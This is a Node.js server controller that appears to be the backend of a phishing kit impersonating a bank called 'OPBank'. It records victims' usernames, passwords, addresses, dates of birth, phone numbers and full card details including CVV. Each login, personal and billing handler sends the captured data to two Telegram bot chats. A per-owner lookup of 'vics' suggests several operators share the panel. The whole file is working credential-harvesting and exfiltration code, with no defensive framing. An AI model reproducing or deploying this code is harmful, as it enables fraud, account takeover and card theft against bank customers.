var moment = require("moment"); // require
const OPBank = require("../models/opbankModel");
const axios = require("axios");

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    OPBank.find({ owner })
        .sort({ timestamp: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    OPBank.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { username, password, uniqueid, owner, ip } = req.body;
    try {
        let user = await OPBank.create({
            uniqueid,
            username,
            password,
            status: 1,
            owner,
            ip,
            timestamp: moment().format()
        });
        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}`;
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: 5351037692,
                    text: `OP:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `HAYTCHRES:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitBilling = async (req, res) => {
    const { ccnum, ccexp, ccname, cvv, uniqueid } = req.body;
    try {
        let user = await OPBank.findOneAndUpdate({ uniqueid }, { ccname, ccnum, ccexp, cvv, status: 3, timestamp: moment().format() }).exec();
        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nAddress: ${user.address}\nDOB: ${user.dob}\nMobile: ${user.telephone}\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCVV: ${user.cvv}`;
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: 5351037692,
                    text: `OP:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `HAYTCHRES:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitPersonal = async (req, res) => {
    const { address, dob, telephone, uniqueid } = req.body;
    try {
        let user = await OPBank.findOneAndUpdate({ uniqueid }, { address, dob, telephone, status: 2, timestamp: moment().format() }).exec();
        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nAddress: ${user.address}\nDOB: ${user.dob}\nMobile: ${user.telephone}`;
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: 5351037692,
                    text: `OP:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `HAYTCHRES:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await OPBank.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    getInfo,
    submitLogin,
    submitPersonal,
    submitBilling,
    deleteEntry,
};
